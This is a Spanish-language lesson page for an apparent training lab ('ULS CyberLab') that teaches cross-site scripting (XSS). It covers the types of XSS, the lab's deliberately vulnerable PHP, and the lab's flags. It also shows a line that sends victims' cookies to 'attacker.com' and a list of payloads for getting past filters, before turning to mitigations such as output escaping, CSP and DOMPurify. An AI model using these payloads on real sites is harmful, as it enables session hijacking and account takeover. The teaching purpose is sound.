---
title: Cross-Site Scripting (XSS)
description: Teoría completa sobre XSS - Marco Teórico ULS CyberLab
sidebar:
  order: 12
---

# Cross-Site Scripting (XSS)

## ¿Qué es XSS?

**Cross-Site Scripting (XSS)** es una vulnerabilidad web que permite a los atacantes **inyectar scripts del lado del cliente** (generalmente JavaScript) en páginas web vistas por otros usuarios. A diferencia del SQL Injection (que ataca la base de datos), XSS ataca directamente al **navegador de la víctima**.

La "víctima" en XSS no es el servidor, sino otros **usuarios** de la aplicación.

```
Ataque SQLi:  Atacante → Servidor/DB    (atacante extrae datos del servidor)
Ataque XSS:   Atacante → Víctima        (atacante usa el servidor como intermediario para atacar usuarios)
```

---

## ¿Cómo Funciona?

El ataque básico:

1. **Atacante** encuentra un campo donde el input del usuario se muestra sin escapar
2. **Inyecta** código JavaScript malicioso
3. La **aplicación** almacena o refleja ese código
4. **Víctima** visita la página y su navegador **ejecuta** el JavaScript
5. El JavaScript corre con los **permisos del dominio** de la aplicación

```html
<!-- El usuario ingresa esto en un formulario de comentario -->
<script>alert('Soy el atacante! Tu cookie es: ' + document.cookie)</script>

<!-- La aplicación lo muestra sin escapar -->
<div class="comment">
  <script>alert('Soy el atacante! Tu cookie es: ' + document.cookie)</script>
</div>

<!-- El navegador de la víctima ejecuta el script -->
```

---

## Tipos de XSS

### 1. Reflected XSS (No Persistente)

El payload viaja en la **URL** y el servidor lo **refleja** inmediatamente en la respuesta.

```
Flujo:
Atacante → Crea URL maliciosa → Envía a víctima → Víctima hace clic
       → Servidor refleja el script → Navegador ejecuta el script
```

**Ejemplo en ULS CyberLab** (`modules/xss.php`):
```php
// Código vulnerable
$search_term = $_GET['q'];  // Sin sanitizar
echo "Resultados para: $search_term";  // Sin escapar
```

**URL maliciosa:**
```
http://localhost/mini-cyberlab/modules/xss.php?q=<script>alert('XSS')</script>
```

**Uso real por atacantes:** Phishing — el atacante envía el URL malicioso por email/WhatsApp. La víctima confía en el dominio (localhost/bank.com/etc.) pero el script es del atacante.

### 2. Stored XSS (Persistente) — El más peligroso

El payload se **almacena en el servidor** (base de datos) y se ejecuta **cada vez** que alguien ve la página.

```
Flujo:
Atacante → Sube payload → Se guarda en DB → Cualquier visitante lo activa
```

**Ejemplo en ULS CyberLab** (comentarios en `modules/xss.php`):
```php
// Código vulnerable - almacenamiento
$comment = $_POST['comment'];  // Sin sanitizar
$stmt = $conn->prepare("INSERT INTO comments (comment) VALUES (?)");
$stmt->bind_param("s", $comment);  // El payload se guarda en DB

// Código vulnerable - renderizado  
echo $c['comment'];  // Sin htmlspecialchars(), ejecuta el script
```

**Payload almacenado:**
```html
<script>
  fetch('/mini-cyberlab/api/capture_flag.php', {
    method: 'POST',
    body: 'flag=FLAG{XSS_ST0R3D_PWN3D}'
  });
</script>
```

**Impacto:** Afecta a **todos** los usuarios que visiten la sección de comentarios, no solo a uno.

### 3. DOM-Based XSS

El payload nunca llega al servidor — el JavaScript de la página lo procesa directamente del DOM.

```javascript
// Código vulnerable en el frontend
var search = location.hash.substring(1);  // Lee del URL #fragment
document.getElementById('result').innerHTML = search;  // Inyecta en DOM

// Payload: http://victim.com/page#<img src=x onerror=alert(1)>
```

En ULS CyberLab no está implementado, pero es importante conocerlo.

---

## Impacto de XSS

| Ataque | Descripción |
|--------|-------------|
| **Robo de cookies** | `document.cookie` → Session hijacking |
| **Keylogger** | Capturar contraseñas mientras el usuario las escribe |
| **Redirección** | `window.location = "phishing-site.com"` |
| **Defacement** | Modificar el contenido de la página |
| **Crypto mining** | Usar la CPU de la víctima para minar criptomonedas |
| **BeEF** | Browser Exploitation Framework — control completo del navegador |
| **CSRF** | Ejecutar acciones en nombre de la víctima |

### Session Hijacking con XSS

```javascript
// El atacante roba la cookie de sesión
new Image().src = 'http://attacker.com/steal?cookie=' + document.cookie;

// Con la cookie, el atacante inicia sesión como la víctima:
// document.cookie = "PHPSESSID=stolen_value"
```

---

## XSS en ULS CyberLab

### Reflected XSS (10 puntos)

**Módulo:** `modules/xss.php`, parámetro `?q=`

```php
// Línea vulnerable
echo "Resultados para: $search_term";
// Debería ser: echo "Resultados para: " . htmlspecialchars($search_term);
```

**Payload:**
```html
<script>alert('XSS Reflejado!')</script>
```

**Detección automática:** ULS CyberLab hookea `window.alert`:
```javascript
window.alert = function(msg) {
  // Captura FLAG{XSS_R3FL3CT3D} automáticamente
  fetch('/mini-cyberlab/api/capture_flag.php', {
    method: 'POST',
    body: 'flag=FLAG{XSS_R3FL3CT3D}'
  });
};
```

### Stored XSS (20 puntos)

**Módulo:** `modules/xss.php`, formulario de comentarios

**Payload para el comentario:**
```html
<script>alert('XSS Almacenado!')</script>
```

**Detección:** Al cargar la página, el JS detecta patrones XSS en comentarios y captura la flag.

---

## Bypasses Comunes de Filtros XSS

Si la aplicación filtra `<script>`, existen alternativas:

```html
<!-- Evento HTML -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>

<!-- Sin comillas -->
<img src=x onerror=alert`1`>

<!-- Caso mixto (evitar filtros por mayúsculas/minúsculas) -->
<ScRiPt>alert(1)</ScRiPt>

<!-- Codificación -->
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>

<!-- Sin palabras clave -->
<script>top['al'+'ert'](1)</script>
```

---

## Mitigación

### ✅ Output Encoding (La solución principal)

```php
// ❌ Vulnerable
echo $user_input;

// ✅ Seguro - htmlspecialchars convierte < > " ' & en entidades HTML
echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');
```

### ✅ Content Security Policy (CSP)

El header HTTP más poderoso contra XSS:

```php
// En PHP
header("Content-Security-Policy: default-src 'self'; script-src 'self'");
```

```apache
# En .htaccess de Apache
Header always set Content-Security-Policy "default-src 'self'; script-src 'self'"
```

Con esta política, el navegador **rechaza** ejecutar cualquier script que no venga del mismo dominio.

### ✅ HTTPOnly Cookies

```php
// Protege las cookies para que JavaScript no pueda accederlas
session_set_cookie_params(['httponly' => true, 'secure' => true]);
```

### ✅ Input Validation

```php
// Validar que el input coincida con el formato esperado
if (!preg_match('/^[a-zA-Z0-9 ]{1,100}$/', $comment)) {
    die("Comentario inválido - solo letras, números y espacios permitidos");
}
```

### ✅ DOMPurify (Para aplicaciones con mucho HTML dinámico)

```javascript
// Librería JS que limpia HTML antes de insertarlo al DOM
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(user_input);
```

---

## Recursos

- [PortSwigger XSS Labs](https://portswigger.net/web-security/cross-site-scripting)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [XSS Game de Google](https://xss-game.appspot.com/)
- [PayloadsAllTheThings - XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
